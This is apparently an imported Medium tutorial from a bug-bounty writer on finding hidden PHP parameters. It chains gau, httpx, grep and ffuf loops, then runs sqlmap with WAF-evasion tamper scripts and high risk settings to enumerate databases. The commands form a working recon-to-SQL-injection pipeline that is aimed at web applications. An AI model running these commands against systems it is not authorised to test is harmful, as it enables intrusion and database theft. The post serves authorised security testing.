---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-11-02_fuzzing-for-hidden-params_2.md
original_filename: 2022-11-02_fuzzing-for-hidden-params_2.md
title: Fuzzing For Hidden Params
category: documents
detected_topics:
- sqli
- command-injection
tags:
- imported
- documents
- sqli
- command-injection
language: en
raw_sha256: 47522d329e660bd8617b5ca0de5c5fe0fefb3e03af7f1727c92def36028f99d6
text_sha256: 533f3c60c7908ca74615f211cb2f4e4f276bbf5b3e959ff4ed0da8bd9dc95bd0
ingested_at: '2026-06-28T07:32:15Z'
sensitivity: unknown
redactions_applied: false
---

# Fuzzing For Hidden Params

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-11-02_fuzzing-for-hidden-params_2.md
- Source Type: markdown
- Detected Topics: sqli, command-injection
- Ingested At: 2026-06-28T07:32:15Z
- Redactions Applied: False
- Raw SHA256: `47522d329e660bd8617b5ca0de5c5fe0fefb3e03af7f1727c92def36028f99d6`
- Text SHA256: `533f3c60c7908ca74615f211cb2f4e4f276bbf5b3e959ff4ed0da8bd9dc95bd0`


## Content

---
title: "Fuzzing For Hidden Params"
page_title: "Fuzzing Websites to Find Hidden Parameters | by calfcrusher | The Gray Area"
url: "https://medium.com/@calfcrusher/fuzzing-for-hidden-params-671724bf3fd7"
authors: ["calfcrusher"]
bugs: ["SQL injection"]
publication_date: "2022-11-02"
added_date: "2022-11-03"
source: "pentester.land/writeups.json"
original_index: 1959
scraped_via: "browseros"
---

# Fuzzing For Hidden Params

Top highlight

Fuzzing Websites to Find Hidden Parameters
calfcrusher
Follow
2 min read
·
Nov 2, 2022

228

7

TL;DR- A great how-to guide on finding hidden parameters that could lead to significant exploitaiton of a website or application.

Hello hackers, today I’ll be demonstrating a method of fuzzing websites to find hidden parameters and other exploit vectors.

Let’s start !

Press enter or click to view image in full size
Get urls from subdomains using gau
cat subdomains.txt | gau --blacklist png,jpg,gif,jpeg,swf,woff,svg,pdf,tiff,tif,bmp,webp,ico,mp4,mov,js,css,eps,raw | tee all_urls.txt

2) Clean urls and check for http status code 200

cat all_urls.txt | uro | httpx -mc 200 -silent | tee live_urls.txt

3) Grep all php endpoints

cat live_urls.txt | grep ".php" | cut -f1 -d"?" | sed 's:/*$::' | sort -u > php_endpoints_urls.txt

4) Fuzz possible hidden params with ffuf

Get calfcrusher’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

GET

for URL in $(<php_endpoints_urls.txt); do (ffuf -u "${URL}?FUZZ=1" -w params_list.txt -mc 200 -ac -sa -t 20 -or -od ffuf_hidden_params_sqli_injections); done

POST

for URL in $(<php_endpoints_urls.txt); do (ffuf -X POST -u "${URL}" -w params_list.txt -mc 200 -ac -sa -t 20 -or -od ffuf_hidden_params_sqli_injections -d "FUZZ=1"); done

If you found a hidden valid param, it could be vulnerable to sql injection so next step will be check those urls-params that they returned status code 200 with SQLMAP, like this (GET example)-

sqlmap -u "URL" --random-agent --tamper="between,randomcase,space2comment" -v 2 --dbs --level 5 --risk 3 --batch --smart

I’ve found a couple of SQL Injection on VPD programs with this method :)

You can apply the same method to .asp(x) files

RESOURCE

For list of params try this:

https://github.com/Bo0oM/ParamPamPam/blob/master/params.txt

You can of course generate a custom list for your target.

Give a try also to https://github.com/s0md3v/Arjun a comprehensive HTTP parameter discovery suite.

The Gray Area is a collection of great cybersecurity and computer science posts. The best articles are highlighted in a weekly newsletter, sent out every Wednesday. To get updates whenever The Gray Area publishes an article, check out our Twitter page, @TGAonMedium.
